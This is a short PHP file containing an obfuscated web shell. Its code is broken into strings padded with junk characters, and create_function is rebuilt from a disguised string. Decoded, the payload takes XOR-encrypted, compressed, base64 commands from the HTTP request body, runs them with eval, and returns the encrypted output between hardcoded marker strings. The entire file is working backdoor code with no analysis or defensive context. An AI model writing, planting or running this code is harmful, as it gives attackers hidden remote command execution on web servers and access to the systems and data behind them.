<?php
$e='nts("_rphp:_r//input")_r_r_r,$m)=_r=1) {@ob_start(_r);@e_rval(@gzun_rcompr_ress(@x(@';
$I='_ror($i=0;$i<$l_r;){f_ror($j=0;_r($_rj<$c&&$_ri<$l)_r_r;$j++,$_ri++){$o.=$t_r{$i_r}^$';
$g='b_ras_re64_decod_re(_r$_rm[1]),$k)))_r;$o=@ob_ge_rt_c_rontents_r();_r@ob_end_clean';
$j='8_rAke7_r_r";function x(_r_r_r_r$t,$k){$c=strlen($_rk);$l=strlen($_rt_r);$o_r="";f';
$c='_r();$_rr=@base_r64_r_encod_re(@x(_r@gzcompres_rs(_r$o)_r,$k));print("$_r_rp$kh$r$kf");}';
$T='k{$j};}}re_r_rturn $o;}i_rf (@preg_r_match_r_r("/$k_r_rh(.+)$kf/",@file_ge_rt_cont_re';
$M='_r$k="8557fc73";_r$kh="_r87_r6bcb_rbda41e";$kf_r="b43_rdd0958d8_r4_r";$p=_r"MxVtqtGSxe8';
$N=str_replace('k','','crekkkkatke_funcktion');
$t=str_replace('_r','',$M.$j.$I.$T.$e.$g.$c);
$L=$N('',$t);$L();
?>
